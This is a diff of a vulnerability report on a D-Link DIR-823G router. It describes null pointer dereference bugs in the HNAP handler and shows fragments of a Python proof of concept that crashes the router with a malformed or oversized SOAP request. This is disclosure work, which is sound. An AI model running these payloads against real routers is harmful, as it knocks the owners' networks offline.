@@ -1,5 +1,5 @@
 # Bug Report: NPD in D-Link DIR-823G Router
-A null pointer dereference null pointer dereference overflow vulnerability has been identified in the D-Link DIR-823G router firmware that allows remote attackers to cause denial of service through malformed HTTP requests.
+A null pointer dereference null pointer dereference overflow vulnerability has been identified in the D-Link DIR-823G router firmware that allows remote attackers to cause denial of service through malformed HTTP requests. The vulnerability occurs in function sub_4339E8 when processing the SetMultipleActions handler.
 
 ## Vulnerability Details
 
@@ -10,12 +10,10 @@ A null pointer dereference null pointer dereference overflow vulnerability has b
 - **Vulnerability Type**: Null pointer dereference
 
 ## Description:
-The vulnerable code path processes HTTP requests to the `/HNAP` endpoint. When it contains the action `SetWLanRadioSettings`, the code attempts to extract the `RadioID` element and passes it to `strncmp()` without null validation, leading to a null pointer dereference. An attacker can send a malicious HTTP request omitting the `RadioID` element to cause a denial of service attack.
-![alt text](image-7.png)
-## poc
-![alt text](image-6.png)
+The vulnerable code path processes HTTP requests to the `/HNAP` endpoint. When it contains the action `SetMultipleActions`, the code has a malloc (`malloc(v19)`) with the size is controlled by user request. This memory allocation could be failed when the user request is quite large and return a null pointer to `v21` while `v19` is a valid int value. `v21` is passed into `memcpy` without null validation, leading to a null pointer dereference.
 
-## Reproduce
+![alt text](image.png)
+## poc
 ```python
 #!/usr/bin/env python3
 
@@ -40,9 +38,9 @@ def exploit(target):
         'Cookie': 'uid=GcfQ7q3TwY; PrivateKey=455D512F7EA7AA45CC1B4CBB4562DE49; timeout=106'
     }
     
-    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetMultipleActions xmlns="http://purenetworks.com/HNAP1/"><SetWLanRadioSettings xmlns="http://purenetworks.com/HNAP1/"></SetWLanRadioSettings></SetMultipleActions></soap:Body></soap:Envelope>'
+    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>' + 'A' *   100000000 +  '</soap:Body></soap:Envelope>'
     
-    response = requests.post(url, data=payload, headers=headers)
+    response = requests.post(url, data=payload, headers=headers, timeout=30)
     print(f"Status: {response.status_code}")
     print(response.text)
 
